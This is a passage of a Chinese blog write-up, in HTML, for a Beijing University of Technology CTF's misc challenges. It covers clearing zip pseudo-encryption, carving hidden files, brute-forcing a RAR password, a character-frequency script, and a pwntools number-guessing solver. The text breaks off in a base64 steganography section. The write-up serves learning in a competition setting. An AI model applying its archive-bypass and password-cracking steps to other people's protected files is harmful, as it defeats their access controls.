@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>北京工业大学CTF-wp | iHui</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Misc佛系青年题目描述：解题思路：附件内的文本文件fo.txt直接打不开，猜测flag就在这个文件里面  然后，发现这个zip是伪加密，就修改此处的0900为0000  修改并保存，接着打开fo.txt，发现其中的佛曰是与佛论禅的密文  在线解密这段密文即得flag  知识扩充： 伪加密，参考我的这篇文章https:&#x2F;&#x2F;xingshuaikun.github.io&#x2F;2019&#x2F;12&#x2F;25&#x2F;zip%">
+<meta property="og:type" content="article">
+<meta property="og:title" content="北京工业大学CTF-wp">
+<meta property="og:url" content="http://example.com/2019/12/25/%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6CTF-wp/index.html">
+<meta property="og:site_name" content="iHui">
+<meta property="og:description" content="Misc佛系青年题目描述：解题思路：附件内的文本文件fo.txt直接打不开，猜测flag就在这个文件里面  然后，发现这个zip是伪加密，就修改此处的0900为0000  修改并保存，接着打开fo.txt，发现其中的佛曰是与佛论禅的密文  在线解密这段密文即得flag  知识扩充： 伪加密，参考我的这篇文章https:&#x2F;&#x2F;xingshuaikun.github.io&#x2F;2019&#x2F;12&#x2F;25&#x2F;zip%">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225143947711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225144249674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225144354106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225144559727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225152212269.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225152656398.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225152543532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225153127282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225155009621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225154022489.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225170342557.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225170521589.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225170834945.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109103829892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109104301863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225172113783.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225172209882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191226083642799.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191226100023974.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191226100606662.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191226100900545.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191226101045685.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191226101310311.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191226130231606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225190719315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225190832322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225190918321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225191949696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225192419556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191226134751833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191226134450651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191226134820556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191226134708758.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109115416760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109132239697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109114038325.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109133237750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109133439663.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109115727183.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109133838937.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109115813778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109115851504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109115922214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109120024419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109161030277.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225175932635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225180422584.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191225180808651.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109163707222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109165147977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109171732997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020010917183624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109180542277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020010918061374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109180833448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109180932755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/202001091810219.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020010918314745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109182214830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109183212448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109183321803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109183346706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109183428672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109183524100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200109183546925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2019-12-25T06:30:42.000Z">
+<meta property="article:modified_time" content="2021-02-26T10:10:39.036Z">
+<meta property="article:author" content="iHui">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20191225143947711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+  
+    <link rel="alternate" href="/atom.xml" title="iHui" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">iHui</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-北京工业大学CTF-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/12/25/%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6CTF-wp/" class="article-date">
+  <time class="dt-published" datetime="2019-12-25T06:30:42.000Z" itemprop="datePublished">2019-12-25</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      北京工业大学CTF-wp
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="佛系青年"><a href="#佛系青年" class="headerlink" title="佛系青年"></a>佛系青年</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>附件内的文本文件fo.txt直接打不开，猜测flag就在这个文件里面</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225143947711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="fo.txt报错"></p>
+<p>然后，发现这个zip是伪加密，就修改此处的0900为0000</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225144249674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="修改位置"></p>
+<p>修改并保存，接着打开fo.txt，发现其中的佛曰是与佛论禅的密文</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225144354106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="fo.txt中的内容"></p>
+<p>在线解密这段密文即得flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225144559727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="得到flag"></p>
+<h3 id="知识扩充："><a href="#知识扩充：" class="headerlink" title="知识扩充："></a>知识扩充：</h3><ol>
+<li>伪加密，参考我的这篇文章<a target="_blank" rel="noopener" href="https://xingshuaikun.github.io/2019/12/25/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/">https://xingshuaikun.github.io/2019/12/25/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/</a></li>
+<li>与佛论禅网站<a target="_blank" rel="noopener" href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></li>
+</ol>
+<h2 id="gakki"><a href="#gakki" class="headerlink" title="gakki"></a>gakki</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>解压压缩包，得到一个wolaopo.jpg的图片，唉，也不知道出题人有多饥渴</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225152212269.png" alt="图片中的文件"></p>
+<p>binwalk查看这个图片中有挺多文件的，于是就用foremost分离</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225152656398.png" alt="foremost分解图片"></p>
+<p>然后得到了一个压缩包，而且里面就是flag.txt，并且加密了</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225152543532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="得到rar压缩包"></p>
+<p>最终用ARCHPR爆出来了压缩包的密码是8863</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225153127282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="爆出密码8864"></p>
+<p>解出flag.txt文件，内容为看不懂是什么密码的密码，通过HxD统计出不同字符出现的次数排序依次排列得出flag。</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225155009621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="HxD字符分析"></p>
+<p>也可以通过代码统计出不同字符出现的次数排序，依次排列得出flag。</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225154022489.png" alt="得到flag"></p>
+<h3 id="知识扩充：-1"><a href="#知识扩充：-1" class="headerlink" title="知识扩充："></a>知识扩充：</h3><p>字符次序统计代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">def processLine(line, CharacterCounts):</span><br><span class="line">    for character in line:</span><br><span class="line">        # if ord(character) in range(97, 123):</span><br><span class="line">        if ord(character) in range(32, 126):</span><br><span class="line">            CharacterCounts[character] += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 创建字母字典</span><br><span class="line">def createCharacterCounts(CharacterCounts):</span><br><span class="line">    # for i in range(97, 123):</span><br><span class="line">    for i in range(32, 126):</span><br><span class="line">        CharacterCounts[chr(i)] = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 用户输入一个文件名</span><br><span class="line">    # filename = input(&quot;enter a filename:&quot;).strip()</span><br><span class="line">    filename = &quot;D:\\bjutCTF\\MISC\\output\\rar\\flag.txt&quot;</span><br><span class="line">    infile = open(filename, &quot;r&quot;)</span><br><span class="line"></span><br><span class="line">    # 建立用于计算词频的空字典</span><br><span class="line">    CharacterCounts = &#123;&#125;</span><br><span class="line">    # 初始化字典键值</span><br><span class="line">    createCharacterCounts(CharacterCounts)</span><br><span class="line">    for line in infile:</span><br><span class="line">        # processLine(line.lower(), CharacterCounts)</span><br><span class="line">        processLine(line, CharacterCounts)</span><br><span class="line"></span><br><span class="line">    # 从字典中获取数据对</span><br><span class="line">    pairs = list(CharacterCounts.items())</span><br><span class="line"></span><br><span class="line">    # 列表中的数据对交换位置,数据对排序</span><br><span class="line">    items = [[x, y] for (y, x) in pairs]</span><br><span class="line">    items.sort(reverse=True)</span><br><span class="line"></span><br><span class="line">    # 输出count个数词频结果</span><br><span class="line">    for i in range(len(items)):</span><br><span class="line">        # print(items[i][1]+&quot;\t&quot;+str(items[i][0]))</span><br><span class="line">        print(items[i][1], end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    infile.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h2 id="babync"><a href="#babync" class="headerlink" title="babync"></a>babync</h2><h3 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h3><p>你高数过了嘛，nc 183.129.189.60 10029</p>
+<h3 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h3><p>尝试几个数字</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225170342557.png" alt="尝试nc"></p>
+<p>直接上脚本pwntools，折半查找</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;183.129.189.60&#x27;,&#x27;10029&#x27;)</span><br><span class="line">numi = 340282366879330029263004840</span><br><span class="line">numa = 340289366879330029263994840</span><br><span class="line">numv = (numa + numi) / 2</span><br><span class="line">while 1:</span><br><span class="line">	p.sendline(str(numv))</span><br><span class="line">	ret = p.recv()</span><br><span class="line">	if ret == &#x27;too small&#x27;:</span><br><span class="line">		numi = numv</span><br><span class="line">		print &#x27;small&#x27;</span><br><span class="line">	elif ret == &#x27;too big&#x27;:</span><br><span class="line">		numa = numv</span><br><span class="line">		print &#x27;big&#x27;</span><br><span class="line">	elif ret ==&#x27;It took too long to break the link!&#x27;:</span><br><span class="line">		print &#x27;slow&#x27;</span><br><span class="line">		break</span><br><span class="line">	else:</span><br><span class="line">		print ret</span><br><span class="line">	numv = (numa + numi) / 2</span><br><span class="line">	print numv</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191225170521589.png" alt="得到flag"></p>
+<h2 id="SXMgdGhpcyBiYXNlPw-x3D-x3D"><a href="#SXMgdGhpcyBiYXNlPw-x3D-x3D" class="headerlink" title="SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;"></a>SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;</h2><h3 id="题目描述：-3"><a href="#题目描述：-3" class="headerlink" title="题目描述："></a>题目描述：</h3><h3 id="解题思路：-3"><a href="#解题思路：-3" class="headerlink" title="解题思路："></a>解题思路：</h3><p>题目base64解密之后的结果如下所示</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225170834945.png" alt="题目解密"></p>
+<p>然后，对它进行base64解密，得到的是莫扎特的一首音乐歌词，有兴趣的朋友可以听听看！</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109103829892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="莫扎特歌曲"></p>
+<p>关于base64隐写的介绍，大家可以看我的另一篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://xingshuaikun.github.io/2020/01/09/base64%E9%9A%90%E5%86%99%EF%BC%88%E8%BD%AC%EF%BC%89/">base64隐写</a></p>
+<p>看完上面的文章后，我这里直接从上面文章中拿来脚本如下：</p>
